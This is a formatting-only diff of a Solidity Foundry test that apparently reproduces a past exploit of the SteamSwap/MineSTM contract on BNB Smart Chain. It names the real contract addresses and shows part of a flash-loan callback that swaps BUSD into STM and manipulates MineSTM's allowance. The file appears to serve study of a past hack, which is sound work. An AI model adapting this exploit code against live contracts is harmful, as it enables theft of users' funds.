@@ -14,14 +14,16 @@ import "../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0xb7d0a1adafa3e9e8d8e244c20b6277bee17a09b6#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface IMineSTM {
     function updateAllowance() external;
-    function sell(uint256 amount) external;
+    function sell(
+        uint256 amount
+    ) external;
 }
 
 interface ICake_LP {
@@ -38,7 +40,6 @@ contract SteamSwap is BaseTestWithBalanceLog {
     address internal constant STM = 0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0;
     address internal constant MineSTM = 0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6;
 
-
     function setUp() public {
         vm.createSelectFork("bsc", blocknumToForkFrom);
         //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
@@ -54,17 +55,13 @@ contract SteamSwap is BaseTestWithBalanceLog {
 
     function pancakeV3FlashCallback(uint256, uint256, bytes memory) external {
         IERC20(BUSD).approve(PancakeRouter, type(uint256).max);
-        
+
         uint256 balance = IERC20(BUSD).balanceOf(address(this));
         address[] memory path = new address[](2);
         path[0] = BUSD;
         path[1] = STM;
         IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            balance,
-            0,
-            path,
-            address(this),
-            1_717_695_757
+            balance, 0, path, address(this), 1_717_695_757
         );
         IMineSTM(MineSTM).updateAllowance();
         IERC20(STM).approve(MineSTM, type(uint256).max);
